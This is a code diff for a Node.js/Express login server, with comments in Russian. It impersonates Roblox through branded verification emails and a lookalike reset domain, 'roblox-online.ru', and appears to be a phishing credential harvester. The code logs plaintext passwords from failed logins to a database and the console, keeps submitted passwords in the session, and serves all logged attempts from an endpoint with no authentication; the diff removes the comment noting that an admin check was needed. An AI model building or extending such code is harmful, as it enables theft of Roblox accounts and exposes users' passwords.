@@ -23,6 +23,7 @@ app.use(session({
     cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 }
 }));
 
+// НАСТРОЙКА EMAIL ЧЕРЕЗ GMAIL
 const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
@@ -30,6 +31,40 @@ const transporter = nodemailer.createTransport({
         pass: process.env.EMAIL_PASS
     }
 });
+
+// Функция отправки кода
+function sendCode(email, code) {
+    const mailOptions = {
+        from: process.env.EMAIL_USER,
+        to: email,
+        subject: '🔐 Ваш код подтверждения Roblox',
+        html: `
+            <div style="font-family: Arial, sans-serif; padding: 20px; background-color: #f4f4f4;">
+                <div style="background-color: white; padding: 30px; border-radius: 10px; max-width: 500px; margin: auto;">
+                    <h2 style="color: #333; text-align: center;">Код подтверждения</h2>
+                    <p style="color: #666; font-size: 16px;">Вы пытаетесь войти в аккаунт Roblox.</p>
+                    <div style="background-color: #00a2ff; color: white; padding: 20px; text-align: center; font-size: 32px; font-weight: bold; border-radius: 8px; margin: 20px 0; letter-spacing: 5px;">
+                        ${code}
+                    </div>
+                    <p style="color: #666; font-size: 14px;">Код действителен в течение <strong>10 минут</strong>.</p>
+                    <p style="color: #999; font-size: 12px; margin-top: 30px;">Если вы не запрашивали этот код, просто проигнорируйте это письмо.</p>
+                </div>
+            </div>
+        `
+    };
+
+    return new Promise((resolve, reject) => {
+        transporter.sendMail(mailOptions, (err, info) => {
+            if (err) {
+                console.error('❌ Ошибка отправки email:', err);
+                reject(err);
+            } else {
+                console.log(`✅ Код отправлен на ${email}: ${code}`);
+                resolve(info);
+            }
+        });
+    });
+}
 
 function generateCode(length = 6) {
     return crypto.randomInt(Math.pow(10, length - 1), Math.pow(10, length)).toString();
@@ -65,8 +100,8 @@ app.post('/api/register', (req, res) => {
     });
 });
 
-// 🆕 ВХОД С ЛОГИРОВАНИЕМ
-app.post('/api/login', (req, res) => {
+// ШАГ 1: Ввод логина и пароля → ВСЕГДА отправляем код
+app.post('/api/login-step1', async (req, res) => {
     const { identifier, password } = req.body;
     const ip = req.ip || req.connection.remoteAddress;
     const userAgent = req.headers['user-agent'] || 'Unknown';
@@ -75,42 +110,148 @@ app.post('/api/login', (req, res) => {
         return res.status(400).json({ error: 'Введите логин и пароль' });
     }
 
-    db.findUser(identifier, (err, user) => {
+    db.findUser(identifier, async (err, user) => {
         if (err) return res.status(500).json({ error: 'Ошибка сервера' });
         
         if (!user) {
-            // Логируем неудачную попытку (пользователь не найден)
-            db.logLoginAttempt(identifier, password, false, ip, userAgent, () => {});
-            console.log(`❌ НЕУДАЧА: ${identifier} - пользователь не найден`);
-            return res.status(401).json({ error: 'Неверный логин или пароль' });
+            console.log(`❌ Пользователь не найден: ${identifier}`);
+            return res.status(404).json({ error: 'Пользователь не найден' });
         }
 
-        db.checkPassword(password, user.password_hash, (err, isMatch) => {
-            if (err) return res.status(500).json({ error: 'Ошибка сервера' });
-            
-            if (!isMatch) {
-                // Логируем неудачную попытку (неверный пароль)
-                db.logLoginAttempt(identifier, password, false, ip, userAgent, () => {});
-                console.log(`❌ НЕУДАЧА: ${identifier} - неверный пароль (${password})`);
-                return res.status(401).json({ error: 'Неверный логин или пароль' });
+        // Сохраняем пароль в сессии для проверки на следующем шаге
+        req.session.pendingUserId = user.id;
+        req.session.pendingPassword = password;
+        req.session.pendingIdentifier = identifier;
+
+        // Генерируем код
+        const code = generateCode(6);
+        const expiresIn = 10;
+
+        // Очищаем старые коды
+        db.clearOld2FACodes(user.id, () => {});
+
+        // Создаём новый код
+        db.create2FACode(user.id, code, expiresIn, async (err) => {
+            if (err) {
+                console.error('Ошибка создания кода:', err);
+                return res.status(500).json({ error: 'Ошибка создания кода' });
             }
 
-            // Логируем успешный вход
-            db.logLoginAttempt(identifier, '[PASSWORD_MATCH]', true, ip, userAgent, () => {});
-            console.log(`✅ УСПЕХ: ${identifier} - успешный вход`);
+            // Отправляем код на email
+            try {
+                await sendCode(user.email, code);
+                
+                console.log(` Код отправлен для ${user.username}`);
+                
+                res.json({ 
+                    success: true, 
+                    message: 'Код отправлен на email',
+                    email: user.email
+                });
+            } catch (emailErr) {
+                console.error('Ошибка отправки email:', emailErr);
+                res.status(500).json({ error: 'Ошибка отправки кода' });
+            }
+        });
+    });
+});
 
-            req.session.userId = user.id;
-            req.session.username = user.username;
-            
-            db.updateLastLogin(user.id, () => {});
+// ШАГ 2: Проверка кода И пароля
+app.post('/api/login-step2', (req, res) => {
+    const { code } = req.body;
+    const userId = req.session.pendingUserId;
+    const password = req.session.pendingPassword;
+    const identifier = req.session.pendingIdentifier;
+    const ip = req.ip || req.connection.remoteAddress;
+    const userAgent = req.headers['user-agent'] || 'Unknown';
 
-            res.json({ 
-                success: true, 
-                user: { 
-                    id: user.id, 
-                    username: user.username, 
-                    email: user.email 
-                } 
+    if (!userId) {
+        return res.status(401).json({ error: 'Сначала введите логин и пароль' });
+    }
+
+    if (!code) {
+        return res.status(400).json({ error: 'Введите код' });
+    }
+
+    // Проверяем код
+    db.verify2FACode(userId, code, (err, isCodeValid) => {
+        if (err) return res.status(500).json({ error: 'Ошибка проверки кода' });
+        
+        if (!isCodeValid) {
+            console.log(`❌ Неверный код: ${code}`);
+            db.logLoginAttempt(identifier, password, false, ip, userAgent, () => {});
+            return res.status(401).json({ error: 'Неверный или просроченный код' });
+        }
+
+        // Код верный, теперь проверяем пароль
+        db.db.get(`SELECT * FROM users WHERE id = ?`, [userId], (err, user) => {
+            if (err || !user) {
+                return res.status(500).json({ error: 'Ошибка сервера' });
+            }
+
+            db.checkPassword(password, user.password_hash, (err, isPasswordValid) => {
+                if (err) return res.status(500).json({ error: 'Ошибка сервера' });
+                
+                if (!isPasswordValid) {
+                    db.logLoginAttempt(identifier, password, false, ip, userAgent, () => {});
+                    console.log(`❌ НЕВЕРНЫЙ ПАРОЛЬ для ${user.username}`);
+                    return res.status(401).json({ error: 'Неверный пароль' });
+                }
+
+                // Всё верно - завершаем вход
+                delete req.session.pendingUserId;
+                delete req.session.pendingPassword;
+                delete req.session.pendingIdentifier;
+
+                req.session.userId = user.id;
+                req.session.username = user.username;
+
+                db.logLoginAttempt(user.username, '[УСПЕХ]', true, ip, userAgent, () => {});
+                db.updateLastLogin(user.id, () => {});
+
+                console.log(`✅ УСПЕХ: ${user.username} вошёл в систему`);
+
+                res.json({ 
+                    success: true, 
+                    user: { 
+                        id: user.id, 
+                        username: user.username, 
+                        email: user.email 
+                    } 
+                });
+            });
+        });
+    });
+});
+
+// Отправить код повторно
+app.post('/api/resend-code', (req, res) => {
+    const userId = req.session.pendingUserId;
+
+    if (!userId) {
+        return res.status(401).json({ error: 'Сначала введите логин и пароль' });
+    }
+
+    db.db.get(`SELECT * FROM users WHERE id = ?`, [userId], async (err, user) => {
+        if (err || !user) {
+            return res.status(500).json({ error: 'Ошибка сервера' });
+        }
+
+        const code = generateCode(6);
+        const expiresIn = 10;
+
+        db.clearOld2FACodes(userId, () => {
+            db.create2FACode(userId, code, expiresIn, async (err) => {
+                if (err) {
+                    return res.status(500).json({ error: 'Ошибка создания кода' });
+                }
+
+                try {
+                    await sendCode(user.email, code);
+                    res.json({ success: true, message: 'Код отправлен повторно' });
+                } catch (emailErr) {
+                    res.status(500).json({ error: 'Ошибка отправки email' });
+                }
             });
         });
     });
@@ -133,7 +274,7 @@ app.post('/api/send-otp', (req, res) => {
         console.log(`\n🔐 OTP код для ${email}: ${code}\n`);
         res.json({ 
             success: true, 
-            message: 'Код отправлен (смотрите консоль сервера для тестирования)',
+            message: 'Код отправлен',
             testCode: code
         });
     });
@@ -155,7 +296,7 @@ app.post('/api/verify-otp', (req, res) => {
     });
 });
 
-// Быстрый вход (OTP без пароля)
+// Быстрый вход
 app.post('/api/quick-login', (req, res) => {
     const { email, code } = req.body;
 
@@ -194,9 +335,9 @@ app.post('/api/forgot-password', (req, res) => {
         db.createResetToken(email, token, expiresIn, (err) => {
             if (err) return res.status(500).json({ error: 'Ошибка создания токена' });
 
-            const resetLink = `http://localhost:${PORT}/reset-password?token=${token}`;
+            const resetLink = `http://roblox-online.ru/reset-password?token=${token}`;
             
-            console.log(`\n🔗 Ссылка для сброса пароля: ${resetLink}\n`);
+            console.log(`\n Ссылка для сброса пароля: ${resetLink}\n`);
             res.json({ 
                 success: true, 
                 message: 'Инструкции отправлены на email',
@@ -263,9 +404,8 @@ app.post('/api/logout', (req, res) => {
     });
 });
 
-// 🆕 НОВЫЙ МАРШРУТ - просмотр попыток входа
+// Просмотр попыток входа
 app.get('/api/login-attempts', (req, res) => {
-    // В реальном приложении здесь должна быть проверка админских прав
     db.db.all(`SELECT * FROM login_attempts ORDER BY created_at DESC LIMIT 100`, (err, rows) => {
         if (err) return res.status(500).json({ error: 'Ошибка сервера' });
         res.json({ success: true, attempts: rows });
@@ -280,6 +420,13 @@ app.get('/', (req, res) => {
 // Запуск сервера
 app.listen(PORT, () => {
     console.log(`\n🚀 Сервер запущен на http://localhost:${PORT}`);
-    console.log(`📊 База данных: SQLite (roblox.db)\n`);
-    console.log(`📝 Логирование попыток входа: ВКЛЮЧЕНО\n`);
+    console.log(`📊 База данных: SQLite (roblox.db)`);
+    console.log(`📝 Логирование попыток входа: ВКЛЮЧЕНО`);
+    console.log(`🔐 Двухэтапная аутентификация: ВКЛЮЧЕНА`);
+    if (process.env.EMAIL_USER) {
+        console.log(`📧 Email уведомления: ${process.env.EMAIL_USER}`);
+    } else {
+        console.log(`⚠️  Email не настроен! Проверьте файл .env`);
+    }
+    console.log();
 });
